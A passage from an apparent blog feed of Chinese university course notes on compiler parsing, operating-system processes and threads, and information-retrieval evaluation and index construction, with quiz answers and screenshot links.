class="hljs-keyword">match</span>(<span class="hljs-string">')'</span>)            self.S()        <span class="hljs-keyword">else</span>:            self.process = self.process.replace(<span class="hljs-string">"S"</span>, <span class="hljs-string">"ε"</span>, <span class="hljs-number">1</span>)            <span class="hljs-built_in">print</span>(self.process)            self.<span class="hljs-keyword">match</span>(<span class="hljs-string">''</span>)    <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">self</span>):        self.S()        <span class="hljs-keyword">if</span> self.lookahead == <span class="hljs-string">''</span>:            <span class="hljs-built_in">print</span>(<span class="hljs-string">"Matched"</span>)            <span class="hljs-built_in">print</span>(self.process)            <span class="hljs-built_in">print</span>(self.lookaheads)        <span class="hljs-keyword">else</span>:            <span class="hljs-built_in">print</span>(<span class="hljs-string">"Not matched,the lookahead now is"</span>, self.lookahead)            <span class="hljs-built_in">print</span>(self.process)            <span class="hljs-built_in">print</span>(self.lookaheads)            exit(<span class="hljs-number">1</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Enter a string to match: "</span>)    target = <span class="hljs-built_in">input</span>()    matcher = Matcher(target)    matcher.main()</code></pre></div></div><p>运行结果：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211220172106_444_20221025232547008661_894_image-20221009204230516.png" alt="image-20221009204230516"><figcaption aria-hidden="true">image-20221009204230516</figcaption></figure><h4 id="词法分析">词法分析</h4>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统_进程与线程模型</title>
    <link href="/posts/30463/"/>
    <url>/posts/30463/</url>
    
    <content type="html"><![CDATA[<h2 id="操作系统--进程与线程">操作系统--进程与线程</h2><h3 id="进程概念">进程概念</h3><h4 id="从并发开始">从并发开始</h4><p>串行排队</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210733845566_917_20221019110755222583_746_image-20220926142304076.png" alt="image-20220926142304076"><figcaption aria-hidden="true">image-20220926142304076</figcaption></figure><p>分时调用</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210734963850_163_20221019110756926120_483_image-20220926142216136.png" alt="image-20220926142216136"><figcaption aria-hidden="true">image-20220926142216136</figcaption></figure><p>“但是并发除了会让脑子更乱以外并不会让事情变得更好”</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210736115343_796_20221019110758632298_262_image-20220926151301063.png" alt="image-20220926151301063"><figcaption aria-hidden="true">image-20220926151301063</figcaption></figure><p>尽管如此，并发确实可以提高CPU的利用率。当然可能会带来设备（慢操作）延迟。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210737627177_866_20221019110801392732_151_image-20221018192004694.png" alt="image-20221018192004694"><figcaption aria-hidden="true">image-20221018192004694</figcaption></figure><p>C</p><p><strong>进程就是为了“保存”和“恢复”一个程序的执行过程，以实现并发的目标</strong></p><h4 id="进程和程序的区别">进程和程序的区别</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210739060065_253_20221019110803473763_292_image-20221016200649356.png" alt="image-20221016200649356"><figcaption aria-hidden="true">image-20221016200649356</figcaption></figure><h3 id="进程和线程的区别">进程和线程的区别</h3><ul><li><p>进程作为分配资源的基本单位，线程作为独立运行和独立调度的基本单位(注意：在多线程OS 中，进程不是一个可执行的实体)</p></li><li><p>进程拥有一个完整的虚拟地址空间，不依赖于线程而独立存在；反之，线程是进程的一部分，没有自己的地址空间，与进程内的其他线程一起共享分配给该进程的所有资源。</p></li></ul><h3 id="进程的数据结构--pcb">进程的数据结构--PCB</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210740834601_450_20221019110805822552_826_image-20220926152249647.png" alt="image-20220926152249647"><figcaption aria-hidden="true">image-20220926152249647</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210741862299_153_20221019110807671323_383_image-20221018191442452.png" alt="image-20221018191442452"><figcaption aria-hidden="true">image-20221018191442452</figcaption></figure><h3 id="进程的组织">进程的组织</h3><h4 id="进程状态和切换">进程状态和切换</h4><p class="note note-primary">对于某一个进程： 为什么被暂停了？ 为什么选它来运行？为什么选择这个时机进行切换？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210744007444_666_20221019110809885582_767_image-20221018191551669.png" alt="image-20221018191551669"><figcaption aria-hidden="true">image-20221018191551669</figcaption></figure><p>操作系统可以将会触发慢操作的状态记录下来。</p><p class="note note-primary">“把printf的汇编代码放到自己的程序中，并且把控制休眠的指令注释掉，会不会能正常运行？”</p><p>不能。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210745247267_536_20221019110811863911_528_image-20220926161106287.png" alt="image-20220926161106287" width="50%" height="50%"></p><h5 id="五状态进程模型">五状态进程模型</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210746398255_505_20221019110813764309_930_image-20221014152546893.png" alt="image-20221014152546893"><figcaption aria-hidden="true">image-20221014152546893</figcaption></figure><p>关于进程的创建：</p><p>在一个进程被新建时它并非绝对会被调入内存，通常是分两步，首先创建该进程的PCB，并与之关联，但是此时可能面临内存不足或者操作系统限制了最大进程数导致这个进程还无法被调入进程，因此该进程被暂时留在新建态，在这个状态的进程PCB已经创建并且加载进内存，但是进程的代码和数据往往还留在外存中等待加载。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210748249617_239_20221019110816170775_715_image-20221018205252597.png" alt="image-20221018205252597"><figcaption aria-hidden="true">image-20221018205252597</figcaption></figure><p>关于进程的撤销(结束)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210749945224_194_20221019110817967015_206_image-20221016192515282.png" alt="image-20221016192515282"><figcaption aria-hidden="true">image-20221016192515282</figcaption></figure><blockquote><p>B。进程有它的生命周期，不会一直存在于系统中，也不一定需要用户显式地撒销。进程在时间片结束时只是就绪，而不是撤销。阻塞和唤醒是进程生存期的中间状态。进程可在完成时撤销，或在出现内存错误等时撤销。</p></blockquote><p>关于进程的阻塞</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210750935983_266_20221019110819440912_574_image-20221018192631681.png" alt="image-20221018192631681"><figcaption aria-hidden="true">image-20221018192631681</figcaption></figure><p>阻塞态完了会进就绪队列</p><p><a target="_blank" href="https://houbb.github.io/2020/10/04/os-04-sync" style="position: relative; display: -webkit-box; display: -webkit-flex; display: -ms-flexbox; display: flex; box-sizing: border-box; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-align-items: center; -webkit-box-align: center; -ms-flex-align: center; align-items: center; width: 390px; min-height: 84px; border-radius: 8px; max-width: 100%; overflow: hidden; margin: 16px auto; padding: 12px 12px 9px 12px; background-color: #F6F6F6;"><span class="LinkCard-contents"><span style="display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; text-overflow: ellipsis; max-height: 40px; line-height: 1.25; color: #121212;">关于临界资源及其同步和互斥</span><span style="display: -webkit-box; font-size: 13px; height: 18px; line-height: 18px; color: #999; word-break: break-all; text-overflow: ellipsis; overflow: hidden; -webkit-line-clamp: 1; -webkit-box-orient: vertical;"><span style="display: inline-flex; align-items: center;"><svg class="Zi Zi--InsertLink" fill="currentColor" viewBox="0 0 24 24" width="14" height="14"><path d="M13.414 4.222a4.5 4.5 0 1 1 6.364 6.364l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005a2.5 2.5 0 1 0-3.536-3.536l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005zm-6.187 6.187a.5.5 0 0 1 .638-.058l.07.058.706.707a.5.5 0 0 1 .058.638l-.058.07-3.005 3.004a2.5 2.5 0 0 0 3.405 3.658l.13-.122 3.006-3.005a.5.5 0 0 1 .638-.058l.069.058.707.707a.5.5 0 0 1 .058.638l-.058.069-3.005 3.005a4.5 4.5 0 0 1-6.524-6.196l.16-.168 3.005-3.005zm8.132-3.182a.25.25 0 0 1 .353 0l1.061 1.06a.25.25 0 0 1 0 .354l-8.132 8.132a.25.25 0 0 1-.353 0l-1.061-1.06a.25.25 0 0 1 0-.354l8.132-8.132z"></path></svg></span><span>https://houbb.github.io/2020/10/04/os-04-sync</span></span></span></a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210751921582_106_20221019110821096921_713_image-20221018214846546.png" alt="image-20221018214846546"><figcaption aria-hidden="true">image-20221018214846546</figcaption></figure><blockquote><p>B 可以共享一部分资源，但不共享虚拟地址空间</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210753335528_479_20221019110822817914_214_image-20221018214339806.png" alt="image-20221018214339806"><figcaption aria-hidden="true">image-20221018214339806</figcaption></figure><blockquote><p>C</p></blockquote><h5 id="添加了挂起状态的进程模型">添加了挂起状态的进程模型</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210754362386_519_20221019110824611329_729_image-20220926162706586.png" alt="image-20220926162706586"><figcaption aria-hidden="true">image-20220926162706586</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210755618064_936_20221019110826436181_342_image-20221014151453508.png" alt="image-20221014151453508"><figcaption aria-hidden="true">image-20221014151453508</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210757396249_122_20221019110828695748_821_image-20221018192900616.png" alt="image-20221018192900616"><figcaption aria-hidden="true">image-20221018192900616</figcaption></figure><p>A</p><p class="note note-info">不同操作系统中进程状态设置区别很大。</p><h5 id="进程调度方式">进程调度方式</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210758402892_633_20221019110830191623_314_image-20220926162928685.png" alt="image-20220926162928685"><figcaption aria-hidden="true">image-20220926162928685</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210759559721_216_20221019110832168851_702_image-20220926163633315.png" alt="image-20220926163633315"><figcaption aria-hidden="true">image-20220926163633315</figcaption></figure><p>现在的操作系统都是可抢占系统。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210800855757_695_20221019110834324423_859_image-20221018205406513.png" alt="image-20221018205406513"><figcaption aria-hidden="true">image-20221018205406513</figcaption></figure><blockquote><p>A。BC应该将优先级，D时机不合适。</p><p>此部分将在进程调度中详细介绍。</p></blockquote><h4 id="进程通信">进程通信</h4><p>共享存储，消息传递，管道通信</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210802133591_581_20221019110836886804_366_image-20221018211857840.png" alt="image-20221018211857840"><figcaption aria-hidden="true">image-20221018211857840</figcaption></figure><p><a href="https://zhuanlan.zhihu.com/p/58489873">linux中的管道通信</a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210803836196_270_20221019110839761934_452_image-20221018211911941.png" alt="image-20221018211911941"><figcaption aria-hidden="true">image-20221018211911941</figcaption></figure><blockquote><p>A得俩。B容量是一个页的大小(4KB)。管道是一个文件，任何两个不相关的进程当然都可以通过这个管道文件进行通信</p></blockquote><h4 id="进程和线程的设计模型">进程和线程的设计模型</h4><h5 id="线程实现方式">线程实现方式</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210805032394_967_20221019110841591537_254_image-20221018194121923.png" alt="image-20221018194121923"><figcaption aria-hidden="true">image-20221018194121923</figcaption></figure><h6 id="ultuser-level-thread">ULT(User Level Thread)</h6><p>需要注意的是在这种模式下调度仍是以进程为单位进行的</p><p>优势:</p><p>1.线程切换不需要内核模式特权.</p><p>2.线程调用可以是应用程序级的,根据需要可改变调度算法,但不会影响底层的操作系统调度程序.</p><p>3.ULT管理模式可以在任何操作系统中运行,不需要修改系统内核,线程库是提供应用的实用程序。</p><p>劣势:</p><p>1.系统调用(慢操作，如输入输出)会引起进程阻塞，而且进程内的所有线程都被阻塞。(内核每次分配给一个进程的仅有一个CPU，因此进程中仅有一个线程能执行)</p><p>2.不利于使用多处理器并行</p><h6 id="klt">KLT</h6><p>优势：灵活，线程切换快</p><p>劣势：需要用户态到内核态的切换，代价高</p><p>线程库：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210806392125_868_20221019110843340452_876_image-20221018193551401.png" alt="image-20221018193551401"><figcaption aria-hidden="true">image-20221018193551401</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210807734009_103_20221019110847145883_201_image-20221018205754448.png" alt="image-20221018205754448"><figcaption aria-hidden="true">image-20221018205754448</figcaption></figure><blockquote><p>D.其他线程对此不可见</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210808930696_547_20221019110848853722_394_image-20221018214600427.png" alt="image-20221018214600427"><figcaption aria-hidden="true">image-20221018214600427</figcaption></figure><blockquote><p>B只有在KLT中才会这么做</p></blockquote><h5 id="轻权进程"><a href="https://en.wikipedia.org/wiki/Light-weight_process#cite_note-Vah96-1">轻权进程</a></h5><p>类似于一种折衷的方案。但是问题是太复杂</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210810073059_437_20221019110850808418_676_image-20221018234308117.png" alt="image-20221018234308117"><figcaption aria-hidden="true">image-20221018234308117</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息检索_系统评价</title>
    <link href="/posts/23422/"/>
    <url>/posts/23422/</url>
    
    <content type="html"><![CDATA[<h1 id="信息检索_系统评价">信息检索_系统评价</h1><h2 id="总思路">总思路</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210413749537_765_20221102181425241957_651_image-20221102140305383.png" alt="image-20221102140305383"><figcaption aria-hidden="true">image-20221102140305383</figcaption></figure><h2 id="单查询">单查询</h2><h3 id="无序检索结果集合的评价">无序检索结果集合的评价</h3><details><summary>回顾</summary><p>查准率 (Precision) : <span class="math inline">\(P=\frac{T P}{T P+FP}\)</span> 。预测正确的正例数据占预测为正例数据的比例。</p><p>召回率 (Recall) : <span class="math inline">\(R=\frac{TP}{TP+FN}\)</span> 。预测为正例的数据占实际为正例数据的比例。</p>F1值 (F1 score) : <span class="math display">\[F1=\frac{2}{\frac{1}{P}+\frac{1}{R}}=\frac{2 * P * R}{P+R}\nonumber\]</span></details><h3 id="有序检索结果集合的评价">有序检索结果集合的评价</h3><h4 id="p-r曲线的例子">P-R曲线的例子</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210415422791_840_20221102181427482098_652_image-20221102141151261.png" alt="image-20221102141151261"><figcaption aria-hidden="true">image-20221102141151261</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210416775229_758_20221102181431710114_302_image-20221102141322869.png" alt="image-20221102141322869" width="50%" height="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210417972832_913_20221102181432975281_362_image-20221102142019252.png" alt="image-20221102142019252"><figcaption aria-hidden="true">image-20221102142019252</figcaption></figure><h4 id="平均正确率ap">平均正确率AP</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210419282313_192_20221102181435795246_414_image-20221102142247895.png" alt="image-20221102142247895"><figcaption aria-hidden="true">image-20221102142247895</figcaption></figure><h4 id="precisionn">Precision@N</h4><p>Precision@N：在第N个位置上的正确率，对于搜索引擎，大量统计数据表明，大部分搜索引擎用户只关注前一、两页的结果，因此，P@10，P@20对大规模搜索引擎来说是很好的评价指标</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210420576008_695_20221102181437971719_189_image-20221102142715051.png" alt="image-20221102142715051"><figcaption aria-hidden="true">image-20221102142715051</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息检索</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息检索_索引构建、压缩及查询支持</title>
    <link href="/posts/16720/"/>
    <url>/posts/16720/</url>
    
    <content type="html"><![CDATA[<h2 id="信息检索第一部分--索引构建">信息检索第一部分--索引构建</h2><h3 id="倒排索引构建">倒排索引构建</h3><p>六个步骤</p><p>序列化，语言预处理，分配DocID，排序，归并，添加频率标签</p><p class="note note-info">为什么要加文本频率？ 便于进行词频的排序，利于后续查询优化</p><h3 id="倒排索引布尔查询">倒排索引布尔查询</h3><p>略。并行课有涉及。比如当求交时可以先将短的链表求交。</p><h3 id="倒排索引优化改进">倒排索引优化改进</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205858253275_753_20221013143627586751_718_image-20220922093753305.png" alt="image-20220922093753305"><figcaption aria-hidden="true">image-20220922093753305</figcaption></figure><p>为了减少字符串所占用的内存，我们可以将键进行序列化。</p><p>Assume we have 1GB of text 800,000 documents 100 million tokens（Reuters-RCV1 collection）</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205859512816_862_20221013143628933413_566_image-20220922094643439.png" alt="image-20220922094643439" width="50%" height="50%"></p><p>（假设是用int存docID）</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205900610358_356_20221013143629914308_735_image-20220922095054178.png" alt="image-20220922095054178" width="50%" height="50%"></p><p>16*1.4</p><p>看上去很好。</p><p>然而，代价是必须要维护一张termID和字符串的映射表。</p><p>当需要处理的数据特别多时，由于排序，归并过程中所有的数据都需要这个表，就不得不一直将它放到内存里。</p><h4 id="bsbiblocked-sort-based-indexing">BSBI（Blocked Sort-BasedIndexing）</h4><p>仍然保留进行映射的策略</p><p>此算法的主要步骤如下：</p><p>1、将文档中的词进行id的映射，这里可以用hash的方法去构造</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205902036538_244_20221013143631068932_652_image-20220922100056227.png" alt="image-20220922100056227" width="50%" height="50%"></p><p>当然，可以先把全部文档读一遍构建映射，再分块构建倒排索引，也可以在构建每一块的倒排索引的时候边构建边映射。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205903463513_670_20221013143632700535_256_image-20220922101046446.png" alt="image-20220922101046446" width="50%" height="50%"></p><p>2、将文档分割成大小相等的部分。分治</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205904763116_686_20221013143634153162_211_image-20220922095854934.png" alt="image-20220922095854934" width="50%" height="50%"></p><p>3、将每部分按照词ID对上文档ID的方式进行排序（保证分块可以在内存里放下）</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205905976403_245_20221013143635299312_759_image-20220922095946828.png" alt="image-20220922095946828" width="50%" height="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205907157527_173_20221013143636457198_361_image-20220922100557902.png" alt="image-20220922100557902"><figcaption aria-hidden="true">image-20220922100557902</figcaption></figure><p>4、将每部分排序好后的结果进行合并，最后写出到磁盘中。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205908490376_671_20221013143637743125_385_image-20220922095721101.png" alt="image-20220922095721101" width="50%" height="50%"></p><p>归并的过程中也可以分治，比如内存中只能放100个词条的总倒排索引，可以在第100个的时候写出磁盘（因为已经确定是最后结果了），从101个再继续。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205909676971_525_20221013143639158715_536_image-20220922102146120.png" alt="image-20220922102146120" width="50%" height="50%"></p><h4 